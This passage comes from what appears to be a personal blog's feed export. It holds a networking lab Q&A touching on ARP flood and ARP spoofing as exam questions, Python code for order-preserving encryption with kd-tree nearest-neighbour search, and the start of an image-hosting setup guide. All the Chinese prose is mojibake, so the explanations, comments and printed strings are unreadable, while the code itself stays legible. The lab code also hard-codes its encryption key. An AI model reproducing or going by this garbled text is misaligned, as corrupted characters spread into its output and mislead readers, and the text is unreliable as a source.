href="https://blog.csdn.net/qq_31028407/article/details/131118006" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">è¥¿ç”µBæµ‹-è®¡ç®—æœºä¸“ä¸š-è®¡ç®—æœºç½‘ç»œç»¼åˆè®¾è®¡å®éªŒä¸€ç«™å¼æŒ‡å—ï¼ˆä»¥2023.4ä¸ºåŸºå‡†ï¼‰</a>è¿™ç¯‡åšå®¢, è€å¸ˆé—®é—®é¢˜ä¸€èˆ¬æ˜¯æŒ‰é¡ºåºé—®çš„, å¯¹åº”çš„é¡ºåºå°±æ˜¯ä½ ä»¬è¿›å»åçš„é¡ºåº.</p><p>æˆ‘ä»¬ç»„ç¬¬ä¸€ä¸ªäººé—®çš„æ˜¯: </p><ol><li>ç”¨çš„æ˜¯ä»€ä¹ˆè·¯ç”±?(é™æ€è·¯ç”±) </li><li>è¿˜å¯ä»¥ç”¨ä»€ä¹ˆ?(åŠ¨æ€è·¯ç”±RIP)</li><li>æœ€å¸¸ç”¨çš„åŠ¨æ€è·¯ç”±æ˜¯ä»€ä¹ˆ?(OSPF)</li><li>é™æ€è·¯ç”±è·¯ç”±è¡¨æ˜¯åœ¨å“ªäº›è®¾å¤‡ä¸Šé…ç½®çš„ï¼Œæ˜¯å¦‚ä½•é…ç½®çš„?</li></ol><p>ç¬¬äºŒä¸ª:</p><ol><li>dhcpåˆ†é…åœ°å€åœ¨å“ªå®ç°çš„ï¼Ÿ(æŒ‡å‡ºé…ç½®çš„è·¯ç”±å™¨)</li><li>dhcpçš„é…ç½®è¿‡ç¨‹ï¼Ÿ(æŠŠä»£ç å£è¿°ä¸€é, å…ˆè®¾ç½®è·¯ç”±å™¨ç«¯å£ipï¼Œç„¶åå…è®¸dhcpï¼Œåˆ›å»ºçº¿ç¨‹æ± ï¼Œé…ç½®çº¿ç¨‹æ± ç½‘æ®µã€ç½‘å…³â€¦â€¦)</li></ol><p>ç¬¬ä¸‰ä¸ª:</p><ol><li>ä¸ºä»€ä¹ˆæ˜¯500000?(å•ä½æ˜¯kb,åƒå…†ç«¯å£â€¦),ç›´æ¥é—®è¿™ä¸ªæ˜¯æˆ‘ç”µè„‘ä¸ŠæŠŠè¿™ä¸ªäº¤æ¢æœºçš„é…ç½®displayäº†, è€å¸ˆçœ‹åˆ°å°±ç›´æ¥é—®äº†</li><li>arpæ³›æ´ªæ”»å‡»æ˜¯ä»€ä¹ˆ?</li><li>arpæ³›æ´ªæ”»å‡»æ¶ˆè€—çš„æ˜¯ä»€ä¹ˆèµ„æº?(arpè¡¨é¡¹èµ„æº)</li><li>arpæ¬ºéª—æ˜¯æ€ä¹ˆåšåˆ°çš„?(ä¿®æ”¹macåœ°å€â€¦)</li></ol>]]></content>
      
      
      <categories>
          
          <category> xdu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®å®‰å…¨æ£€ç´¢</title>
      <link href="/2024/04/22/2024-4-22-%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%B8%8E%E9%9A%90%E7%A7%812/"/>
      <url>/2024/04/22/2024-4-22-%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%B8%8E%E9%9A%90%E7%A7%812/</url>
      
        <content type="html"><![CDATA[<h3 id="æ•°æ®å®‰å…¨æ£€ç´¢"><a href="#æ•°æ®å®‰å…¨æ£€ç´¢" class="headerlink" title="æ•°æ®å®‰å…¨æ£€ç´¢"></a>æ•°æ®å®‰å…¨æ£€ç´¢</h3><p>å¤§æ•°æ®å®‰å…¨ä¸éšç§è¿™é—¨è¯¾çš„lab2,è¦æ±‚å¦‚ä¸‹å›¾:</p><p><img src="https://pb01.s3.bitiful.net/184.webp" alt="avatar"></p><p>æ–¹æ¡ˆ: </p><ol><li>é‡‡ç”¨OPEä¿åºåŠ å¯†å°†NE.txtæ•°æ®é›†åŠ å¯†ä¸ºNE_encrypt.txtæ•°æ®é›†</li><li>æ„å»ºkdæ ‘</li><li>kdæ ‘æœç´¢é‚»è¿‘èŠ‚ç‚¹</li></ol><h4 id="åŠ å¯†éƒ¨åˆ†ä»£ç "><a href="#åŠ å¯†éƒ¨åˆ†ä»£ç " class="headerlink" title="åŠ å¯†éƒ¨åˆ†ä»£ç :"></a>åŠ å¯†éƒ¨åˆ†ä»£ç :</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> pyope.ope <span class="keyword">import</span> OPE, ValueRange</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å…¥å¤„ç†txtæ–‡ä»¶,è¿”å›äºŒç»´æ•°ç»„ï¼Œæ˜æ–‡å’Œå¯†æ–‡</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LoadTxtMethod</span>(<span class="params">filename</span>):</span><br><span class="line">    cipher = OPE(<span class="string">b&#x27;long key&#x27;</span> * <span class="number">2</span>, in_range=ValueRange(<span class="number">0</span>, <span class="number">10000000</span>),</span><br><span class="line">                 out_range=ValueRange(<span class="number">0</span>, <span class="number">100000000</span>))</span><br><span class="line">    result_m = <span class="built_in">list</span>()  <span class="comment"># æ˜æ–‡ç‚¹</span></span><br><span class="line">    result_c = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(filename):  <span class="comment"># é€è¡Œæ‰“å¼€æ–‡æ¡£.</span></span><br><span class="line">        plain_text = line.split(<span class="string">&#x27; &#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        plain_text[<span class="number">0</span>] = <span class="built_in">float</span>(plain_text[<span class="number">0</span>])</span><br><span class="line">        plain_text[<span class="number">1</span>] = <span class="built_in">float</span>(plain_text[<span class="number">1</span>])</span><br><span class="line">        plain_text_arr = np.array(plain_text)  <span class="comment"># è½¬åŒ–æ•°æ®æ ¼å¼</span></span><br><span class="line">        result_m.append(plain_text_arr)  <span class="comment"># æŠŠç¬¬ä¸€åˆ—æ•°æ®æ·»åŠ åˆ°resultåºåˆ—ä¸­</span></span><br><span class="line">        cipher_text = []</span><br><span class="line">        cipher_text.append(cipher.encrypt(<span class="built_in">int</span>(plain_text[<span class="number">0</span>] * <span class="number">1000000</span>)))</span><br><span class="line">        cipher_text.append(cipher.encrypt(<span class="built_in">int</span>(plain_text[<span class="number">1</span>] * <span class="number">1000000</span>)))</span><br><span class="line">        cipher_text_arr = np.array(cipher_text)  <span class="comment"># è½¬åŒ–æ•°æ®æ ¼å¼</span></span><br><span class="line">        result_c.append(cipher_text_arr)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;åŠ å¯†&quot;</span> + <span class="built_in">str</span>(cipher_text_arr[<span class="number">0</span>]) + <span class="string">&#x27;,&#x27;</span> + <span class="built_in">str</span>(cipher_text_arr[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">return</span> array(result_c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">WriteTxt</span>(<span class="params">cipher_txt</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;NE_encrypt.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> cipher_txt:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">type</span>(x))</span><br><span class="line">            strings = <span class="built_in">str</span>(x[<span class="number">0</span>]) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(x[<span class="number">1</span>]) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            f.write(strings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data = LoadTxtMethod(<span class="string">&#x27;NE.txt&#x27;</span>)  <span class="comment"># è°ƒç”¨ä¸Šé¢æ•°æ®å¤„ç†ç¨‹åº</span></span><br><span class="line">    WriteTxt(data)  <span class="comment"># åŠ å¯†ä¹‹åçš„æ•°æ®å­˜æ”¾äºcipherText.txtä¸­</span></span><br></pre></td></tr></table></figure><h4 id="é‚»è¿‘æœç´¢éƒ¨åˆ†"><a href="#é‚»è¿‘æœç´¢éƒ¨åˆ†" class="headerlink" title="é‚»è¿‘æœç´¢éƒ¨åˆ†:"></a>é‚»è¿‘æœç´¢éƒ¨åˆ†:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> pyope.ope <span class="keyword">import</span> OPE, ValueRange</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç±»ï¼Œç”¨äºä¿å­˜ç»“ç‚¹çš„å€¼ï¼Œå·¦å³å­æ ‘ï¼Œä»¥åŠç”¨äºåˆ’åˆ†å·¦å³å­æ ‘çš„åˆ‡åˆ†è½´</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">decision_node</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value=<span class="literal">None</span>, col=<span class="literal">None</span>, rb=<span class="literal">None</span>, lb=<span class="literal">None</span></span>):</span><br><span class="line">        self.value = value  <span class="comment"># ç‚¹</span></span><br><span class="line">        self.col = col  <span class="comment"># åˆ‡åˆ†çš„ç»´åº¦</span></span><br><span class="line">        self.rb = rb  <span class="comment"># å³å­æ ‘</span></span><br><span class="line">        self.lb = lb  <span class="comment"># å·¦å­æ ‘</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LoadTxtMethod</span>(<span class="params">filename</span>):  <span class="comment"># ä¼ å…¥å½¢å‚,txtçš„åå­—.</span></span><br><span class="line">    result = <span class="built_in">list</span>()  <span class="comment"># åˆ›å»ºè¦è¿”å›çš„æ•°æ®.</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(filename):  <span class="comment"># é€è¡Œæ‰“å¼€æ–‡æ¡£.</span></span><br><span class="line">        data = line.split(<span class="string">&#x27; &#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        data[<span class="number">0</span>] = <span class="built_in">float</span>(data[<span class="number">0</span>])</span><br><span class="line">        data[<span class="number">1</span>] = <span class="built_in">float</span>(data[<span class="number">1</span>])</span><br><span class="line">        data_float = np.array(data)</span><br><span class="line">        result.append(data_float)  <span class="comment"># æŠŠç¬¬ä¸€åˆ—æ•°æ®æ·»åŠ åˆ°resultåºåˆ—ä¸­</span></span><br><span class="line">    <span class="keyword">return</span> array(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ‡åˆ†ç‚¹ä¸ºåæ ‡è½´ä¸Šçš„ä¸­å€¼ï¼Œæ±‚ä¸€ä¸ªåºåˆ—çš„ä¸­å€¼</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">median</span>(<span class="params">x</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(x)</span><br><span class="line">    x = <span class="built_in">list</span>(x)</span><br><span class="line">    x_order = <span class="built_in">sorted</span>(x)</span><br><span class="line">    <span class="keyword">return</span> x_order[n // <span class="number">2</span>], x.index(x_order[n // <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»¥jåˆ—çš„ä¸­å€¼åˆ’åˆ†æ•°æ®ï¼Œå·¦å°å³å¤§ï¼Œj=èŠ‚ç‚¹æ·±åº¦%åˆ—æ•°ï¼Œåˆ—æ•°è¿™é‡Œæ˜¯2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_tree</span>(<span class="params">x, j=<span class="number">0</span></span>):</span><br><span class="line">    rb = []</span><br><span class="line">    lb = []</span><br><span class="line">    m, n = x.shape</span><br><span class="line">    <span class="keyword">if</span> m == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    edge, row = median(x[:, j].copy())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> x[i][j] &gt; edge:</span><br><span class="line">            rb.append(i)</span><br><span class="line">        <span class="keyword">if</span> x[i][j] &lt; edge:</span><br><span class="line">            lb.append(i)</span><br><span class="line">    rb_x = x[rb, :]</span><br><span class="line">    lb_x = x[lb, :]</span><br><span class="line">    rightBranch = build_tree(rb_x, (j + <span class="number">1</span>) % n)</span><br><span class="line">    leftBranch = build_tree(lb_x, (j + <span class="number">1</span>) % n)</span><br><span class="line">    <span class="keyword">return</span> decision_node(x[row, :], j, rightBranch, leftBranch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æœç´¢æ ‘ï¼šè¾“å‡ºç›®æ ‡ç‚¹çš„è¿‘é‚»ç‚¹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">travel_tree</span>(<span class="params">node, aim</span>):</span><br><span class="line">    <span class="keyword">global</span> pointlist  <span class="comment"># å­˜å‚¨æ’åºåçš„kè¿‘é‚»ç‚¹å’Œå¯¹åº”è·ç¦»</span></span><br><span class="line">    <span class="keyword">if</span> node <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">return</span></span><br><span class="line">    col = node.col</span><br><span class="line">    <span class="keyword">if</span> aim[col] &gt; node.value[col]:  <span class="comment"># é¡ºç€æ ‘è¿›è¡Œæœç´¢ï¼Œåˆ†ç±»</span></span><br><span class="line">        travel_tree(node.rb, aim)</span><br><span class="line">    <span class="keyword">if</span> aim[col] &lt; node.value[col]:</span><br><span class="line">        travel_tree(node.lb, aim)</span><br><span class="line">    dis = dist(node.value, aim)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(knears) &lt; k:  <span class="comment"># kæ˜¯è¾“å…¥çš„è¦æŸ¥è¯¢çš„ä¸ªæ•°ï¼Œå‰kä¸ªç‚¹å°±æ˜¯ç›®æ ‡ç‚¹xçš„kè¿‘é‚»</span></span><br><span class="line">        knears.setdefault(<span class="built_in">tuple</span>(node.value.tolist()), dis)  <span class="comment"># åˆ—è¡¨ä¸èƒ½ä½œä¸ºå­—å…¸çš„é”®</span></span><br><span class="line">        pointlist = <span class="built_in">sorted</span>(knears.items(), key=<span class="keyword">lambda</span> item: item[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">elif</span> dis &lt;= pointlist[<span class="number">0</span>][<span class="number">1</span>]:</span><br><span class="line">        knears.setdefault(<span class="built_in">tuple</span>(node.value.tolist()), dis)</span><br><span class="line">        pointlist = <span class="built_in">sorted</span>(knears.items(), key=<span class="keyword">lambda</span> item: item[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> node.rb <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">or</span> node.lb <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># å¯¹äºçˆ¶èŠ‚ç‚¹æ¥è¯´ï¼Œå¦‚æœç›®æ ‡ç‚¹ä¸å…¶åˆ‡åˆ†è½´ä¹‹é—´çš„è·ç¦»ä¸å¤§äºå­—å…¸ä¸­å„ç»“ç‚¹æ‰€å¯¹åº”è·ç¦»çš„çš„æœ€å¤§å€¼ï¼Œä¾¿éœ€è¦è®¿é—®è¯¥çˆ¶èŠ‚ç‚¹çš„å¦ä¸€ä¸ªå­èŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(aim[node.col] - node.value[node.col]) &lt; pointlist[<span class="number">0</span>][<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">if</span> aim[node.col] &lt; node.value[node.col]:</span><br><span class="line">                travel_tree(node.rb, aim)</span><br><span class="line">            <span class="keyword">if</span> aim[node.col] &gt; node.value[node.col]:</span><br><span class="line">                travel_tree(node.lb, aim)</span><br><span class="line">    <span class="keyword">return</span> pointlist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dist</span>(<span class="params">x1, x2</span>):  <span class="comment"># æ¬§å¼è·ç¦»çš„è®¡ç®—</span></span><br><span class="line">    <span class="keyword">return</span> ((np.array(x1) - np.array(x2)) ** <span class="number">2</span>).<span class="built_in">sum</span>() ** <span class="number">0.5</span></span><br><span class="line"></span><br><span class="line">cipher = OPE(<span class="string">b&#x27;long key&#x27;</span> * <span class="number">2</span>, in_range=ValueRange(<span class="number">0</span>, <span class="number">10000000</span>),</span><br><span class="line">                 out_range=ValueRange(<span class="number">0</span>, <span class="number">100000000</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿åºåŠ å¯†</span></span><br><span class="line"><span class="comment"># è¾“å…¥ç»™çš„ç‚¹ï¼Œè¾“å‡ºè°ƒç”¨pyopeåº“åŠ å¯†çš„ç‚¹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encryption</span>(<span class="params">point</span>):</span><br><span class="line">    point[<span class="number">0</span>] = <span class="built_in">float</span>(point[<span class="number">0</span>])</span><br><span class="line">    point[<span class="number">1</span>] = <span class="built_in">float</span>(point[<span class="number">1</span>])  <span class="comment"># æŠŠarrayä¸­çš„ç‚¹è½¬åŒ–ä¸ºfloatç±»å‹</span></span><br><span class="line">    en_point = []</span><br><span class="line">    en_point.append(cipher.encrypt(<span class="built_in">int</span>(point[<span class="number">0</span>] * <span class="number">1000000</span>)))</span><br><span class="line">    en_point.append(cipher.encrypt(<span class="built_in">int</span>(point[<span class="number">1</span>] * <span class="number">1000000</span>)))</span><br><span class="line">    en_point_arr = np.array(en_point)  <span class="comment"># è½¬åŒ–æ•°æ®æ ¼å¼</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> en_point_arr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿åºè§£å¯†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">point</span>):</span><br><span class="line">    point[<span class="number">0</span>] = <span class="built_in">int</span>(point[<span class="number">0</span>])</span><br><span class="line">    point[<span class="number">1</span>] = <span class="built_in">int</span>(point[<span class="number">1</span>])</span><br><span class="line">    de_point = []</span><br><span class="line">    de_point.append(cipher.decrypt(point[<span class="number">0</span>]) / <span class="number">1000000</span>)</span><br><span class="line">    de_point.append(cipher.decrypt(point[<span class="number">1</span>]) / <span class="number">1000000</span>)</span><br><span class="line">    de_point_arr = np.array(de_point)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> de_point_arr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    tmp = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥ç›®æ ‡ç‚¹:&#x27;</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    point_tmp = encryption(tmp)</span><br><span class="line">    aim = []</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> point_tmp:</span><br><span class="line">        aim.append(num)</span><br><span class="line">    knears = &#123;&#125;</span><br><span class="line">    k = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥éœ€è¦æŸ¥è¯¢çš„ç‚¹çš„ä¸ªæ•°&#x27;</span>))</span><br><span class="line">    file = <span class="string">&#x27;NE_encrypt.txt&#x27;</span></span><br><span class="line">    data_c = LoadTxtMethod(file)</span><br><span class="line">    tree = build_tree(data_c)  <span class="comment"># æ„å»ºKD tree</span></span><br><span class="line"></span><br><span class="line">    pointlist = travel_tree(tree, aim)  <span class="comment"># å¯¹ç›®æ ‡ç‚¹è¿›è¡Œæ£€ç´¢</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> point <span class="keyword">in</span> pointlist[-k:]:  <span class="comment"># é‡Œé¢å­˜çš„æœ‰ç‚¹ï¼Œå’Œæ¬§å¼è·ç¦»</span></span><br><span class="line">        x = [point[<span class="number">0</span>][<span class="number">0</span>], point[<span class="number">0</span>][<span class="number">1</span>]]</span><br><span class="line">        de_point = decryption(x)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;****************--------ç¬¬&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;æ¡æ£€ç´¢æ•°æ®--------****************&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ£€ç´¢ç»“æœ: &quot;</span>, de_point)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è·ç¦»ä¸º:&quot;</span>, dist(tmp, de_point))</span><br><span class="line">        i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h4><p><img src="https://pb01.s3.bitiful.net/185.webp" alt="avatar"></p>]]></content>
      
      
      <categories>
          
          <category> xdu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨ </tag>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ªäººå›¾åºŠè§£å†³æ–¹æ¡ˆ</title>
      <link href="/2024/04/21/2024-4-21-%E5%9B%BE%E5%BA%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2024/04/21/2024-4-21-%E5%9B%BE%E5%BA%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h3 id="ä¸ªäººå›¾åºŠè§£å†³æ–¹æ¡ˆ"><a href="#ä¸ªäººå›¾åºŠè§£å†³æ–¹æ¡ˆ" class="headerlink" title="ä¸ªäººå›¾åºŠè§£å†³æ–¹æ¡ˆ"></a>ä¸ªäººå›¾åºŠè§£å†³æ–¹æ¡ˆ</h3><p>åŸå…ˆæˆ‘çš„è§£å†³æ–¹æ¡ˆæ˜¯githubåšå›¾åºŠ,å¥—ä¸€å±‚Cloudflareçš„cdnæ¥åŠ é€Ÿå›½å†…è®¿é—®, ä½†å›½å†…è®¿é—®ä»ç„¶è¿‡æ…¢, ç‰¹åˆ«æ˜¯ä¸€äº›å›¾å¾ˆå¤šçš„æ–‡ç« , åŠ è½½éå¸¸æ…¢. æ‰€ä»¥æˆ‘æƒ³ç€æ”¹å–„ä¸€ä¸‹, åœ¨å¯¹æ¯”äº†ä¸€äº›è§£å†³æ–¹æ¡ˆä¹‹å, æˆ‘é€‰æ‹©äº†PicGo+<a href="https://www.bitiful.com/" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">ç¼¤çº·äº‘</a>æ­å»ºä¸»å›¾åºŠ, éƒ¨åˆ†å›¾ç‰‡æ”¾åœ¨ <a href="https://7bu.top/login" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">å»ä¸å›¾åºŠ</a>, åŸå…ˆçš„æ–¹æ¡ˆä½œä¸ºå¤‡ç”¨æ–¹æ¡ˆ.</p><p>æˆ‘ç”¨å»ä¸å›¾åºŠå­˜å‚¨å¸¸ç”¨å›ºå®šå›¾ç‰‡, åƒèƒŒæ™¯å›¾è¿™äº›, å•å›¾10Gçš„æµé‡, PicGo+ç¼¤çº·äº‘å­˜å‚¨æ–‡ç« å†…æ’å›¾, æ¯æœˆ10Gå…è´¹æµé‡, è™½ç„¶å»ä¸å›¾åºŠå’Œç¼¤çº·äº‘éƒ½ä¸æ˜¯åƒé˜¿é‡Œäº‘, è…¾è®¯äº‘è¿™æ ·çš„å¤§å‚, å¦‚æœå®ƒä»¬è·‘è·¯çš„è¯, æˆ‘çš„å¤‡ç”¨æ–¹æ¡ˆå¯ä»¥ç«‹é©¬é¡¶ä¸Š, ä¸¤åˆ†é’Ÿä¹‹å†…å°±å¯ä»¥åšåˆ°æ›¿æ¢å®Œæˆ, æ‰€ä»¥è¯´è¿˜æ˜¯æ²¡æœ‰å¤ªå¤§éšæ‚£</p><h4 id="ç¼¤çº·äº‘"><a href="#ç¼¤çº·äº‘" class="headerlink" title="ç¼¤çº·äº‘"></a>ç¼¤çº·äº‘</h4><p>æ³¨å†Œå¹¶å®åä¹‹åå°±ä¼šæ‹¥æœ‰æ¯æœˆèµ é€çš„30Gæµé‡</p><p><strong>åˆ›å»ºæ¡¶</strong><br><img src="https://pb01.s3.bitiful.net/173.webp" alt="avatar"><br><img src="https://pb01.s3.bitiful.net/174.webp" alt="avatar"></p><p><strong>é˜²ç›—é“¾é…ç½®</strong><br><img src="https://pb01.s3.bitiful.net/175.webp" alt="avatar"></p><p><strong>æ·»åŠ å­ç”¨æˆ·</strong><br><img src="https://pb01.s3.bitiful.net/176.webp" alt="avatar"><br><img src="https://pb01.s3.bitiful.net/177.webp" alt="avatar"></p><p>Access Keyå’Œ Secret Keyè¦è®°å¥½,ç­‰ä¼šé…ç½®PicGoçš„æ—¶å€™è¦ç”¨åˆ°</p><h4 id="picGo"><a href="#picGo" class="headerlink" title="picGo"></a>picGo</h4><p><strong>ä¸‹è½½picGo</strong>, å¯ä»¥å»çœ‹å®˜æ–¹æ–‡æ¡£, å†™å¾—å¾ˆè¯¦ç»†, æˆ‘æ˜¯ä»å±±ä¸œå¤§å­¦é•œåƒä¸‹è½½çš„<br><img src="https://pb01.s3.bitiful.net/178.webp" alt="avatar"><br><img src="https://pb01.s3.bitiful.net/179.webp" 